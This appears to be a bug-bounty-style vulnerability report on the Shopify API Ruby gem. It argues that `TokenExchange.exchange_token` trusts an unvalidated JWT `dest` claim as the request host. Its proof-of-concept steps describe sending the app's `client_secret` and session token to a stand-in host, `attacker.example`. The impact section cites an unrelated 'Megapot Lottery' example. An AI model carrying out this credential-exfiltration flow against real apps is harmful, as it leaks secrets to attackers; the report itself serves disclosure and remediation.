This confirms a genuine and directly analogous issue: `TokenExchange.exchange_token` is the one code path in `lib/shopify_api/auth/token_exchange.rb` that takes the shop value straight from the JWT `dest` claim and never runs it through `Utils::ShopValidator.sanitize!`, unlike every sibling method (`migrate_to_expiring_token`, `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`) which all call `Utils::ShopValidator.sanitize!(shop)` before building the session.

### Title
Unsanitized JWT `dest` claim used as request host leaks `client_secret` to attacker-controlled domain in `TokenExchange.exchange_token` - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the destination host for the OAuth token-exchange HTTP request directly from the `dest` claim of the caller-supplied session token (id_token), without ever validating that this value is a legitimate `*.myshopify.com`/trusted Shopify domain via `Utils::ShopValidator`. [1](#0-0)  Every other credential-exchange entry point in the same file/module explicitly sanitizes the shop before using it as a request host. [2](#0-1) [3](#0-2) [4](#0-3) 

### Finding Description
`JwtPayload#shop` returns the raw `dest` claim with only the `https://` prefix stripped — it performs no domain allow-listing. [5](#0-4)  `JwtPayload.new` only validates the JWT signature and the `aud` claim against `Context.api_key`; it never checks that `iss`/`dest` belongs to a trusted Shopify domain. [6](#0-5) 

`exchange_token` takes this unsanitized `dest_shop` and builds a `Session` used purely as the HTTP client's host source: `shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)`, then `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")`. [7](#0-6)  `HttpClient#initialize` sets `@base_uri = "https://#{api_host || session.shop}"` — i.e., the request destination is `session.shop` verbatim unless `Context.api_host` is configured. [8](#0-7)  The request body sent to that host contains the app's `client_secret` in plaintext: `client_secret: ShopifyAPI::Context.api_secret_key`. [9](#0-8) 

This breaks the identity binding: **host validated (as a trusted Shopify domain) should equal host that receives the `client_secret`**. Here, the value that is trusted-domain-checked is nothing — the `dest` claim is used unchecked as the destination host for a `client_secret`-bearing POST. In the equivalent sibling flows (`migrate_to_expiring_token`, `client_credentials`, `refresh_access_token`), `Utils::ShopValidator.sanitize!(shop)` enforces that the host is one of `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) before it is used as a request host. [10](#0-9)  `exchange_token` omits this call entirely; the deprecated `shop:` keyword argument is only used to print a deprecation warning and is never validated or applied. [11](#0-10) 

If the JWT signature check can be satisfied with a `dest` value that is not itself constrained to a Shopify domain (e.g. because the host application passes through a session token whose `dest` claim was not independently re-verified against known shop, or a caller error path where the token was decoded/forwarded without host-side binding), the library will happily send the raw `client_secret` and the session token as `subject_token` to whatever host is embedded in `dest`. The library provides no defense-in-depth check here, unlike its sibling flows.

### Impact Explanation
High: this is a credential-leakage/SSRF-with-credentials vector — the exact same class the bug bounty report calls out for the Megapot Lottery example (an unchecked identity/state value controlling a sensitive follow-on operation). Here the unchecked value (`dest_shop`) directly controls the network destination that receives the app's `client_secret`, which maps to the reportable category "SSRF with the app's credentials / credential leakage."

### Likelihood Explanation
Low-to-Medium: exploitation requires a session token whose `dest` claim is not otherwise constrained to a legitimate Shopify domain by the caller's own validation before invoking `exchange_token`. The gem itself provides no such constraint, in contrast to every other credential-issuing method in the same file, which is the root defect being reported.

### Recommendation
In `TokenExchange.exchange_token`, validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` before constructing `shop_session`, mirroring `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`.

### Proof of Concept
1. Caller obtains/forwards a session token (id_token) whose `dest` claim is not pre-validated against a Shopify domain (e.g. a token where `dest` is `"attacker.example"`), satisfying `JwtPayload.new`'s only checks: valid HS256 signature and `aud == Context.api_key`. [12](#0-11) 
2. App calls `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `dest_shop = jwt_payload.shop` yields `"attacker.example"` unchanged. [13](#0-12) 
4. `Clients::HttpClient.new(session: Session.new(shop: "attacker.example"), base_path: "/admin/oauth")` builds `@base_uri = "https://attacker.example"`. [8](#0-7) 
5. The library POSTs `{client_id, client_secret: <app's real secret>, subject_token: token, ...}` to `https://attacker.example/admin/oauth/access_token`, exfiltrating the app's `client_secret` and the session token to the attacker's server. [14](#0-13)
